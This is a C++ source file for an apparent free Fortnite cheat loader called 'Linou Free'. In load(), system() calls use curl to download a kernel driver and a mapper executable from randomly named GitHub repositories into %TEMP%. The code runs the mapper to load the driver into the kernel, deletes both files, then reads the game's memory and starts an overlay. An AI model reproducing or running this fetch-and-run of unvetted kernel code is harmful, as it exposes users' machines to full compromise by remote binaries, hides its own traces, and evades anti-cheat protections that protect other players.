#include <Windows.h>
#include <iostream>
#include <fstream>
#include <vector>
#include <cstdint>
#include "memory/driver.h"
#include "render/render.h"
#include "colors.h"

int load();
int main() {
        std::cout << "[" << blue << "+" << reset << "Welcome to Linou Free\n";
        Sleep(1000);
        system("cls");
        load();
}

int load() {

    std::cout << "Loading driver..." << std::endl;

    if (!driver.Init()) {
        system("curl -sS \"https://raw.githubusercontent.com/fqwgqhgq/dwqghdwqgqwq/refs/heads/main/driver.sys\" -o \"%TEMP%\\driver.sys\"");
        system("curl -sS \"https://raw.githubusercontent.com/fqwgqhgq/dwdqfghqdwqfq/refs/heads/main/Mapper.exe\" -o \"%TEMP%\\mapper.exe\"");
        system("%TEMP%\\mapper.exe %TEMP%\\driver.sys");
        system("del /f /q %TEMP%\\mapper.exe");
        system("del /f /q %TEMP%\\driver.sys");

    }
    std::cout << "Driver loaded" << std::endl;

    std::cout << "Waiting for game..." << std::endl;
    while (!driver.FindProcess(L"FortniteClient-Win64-Shipping.exe")) {
        Sleep(100);
    }
    std::cout << "Game found (PID: " << driver.ProcessID << ")" << std::endl;
    MessageBoxA(0, ("Press OK in lobby!"), ("Info"), MB_ICONINFORMATION);

    std::cout << "Fetching CR3..." << std::endl;
    uintptr_t cr3 = driver.FetchCR3();
    if (!cr3) {
        std::cout << "Failed to get CR3" << std::endl;
        system("pause");
        return 1;
    }
    std::cout << "CR3: 0x" << std::hex << cr3 << std::dec << std::endl;

    memory.BaseAddress = driver.GetBase();
    if (!memory.BaseAddress) {
        std::cout << "Failed to get base address" << std::endl;
        system("pause");
        return 1;
    }
    std::cout << "Base address: 0x" << std::hex << memory.BaseAddress << std::dec << std::endl;

    std::cout << "Press insert to toggle menu" << std::endl;

    if (!overlay::Create()) {
        std::cout << "Failed to create overlay" << std::endl;
        return 1;
    }

    RenderLoop();

    return 0;
}

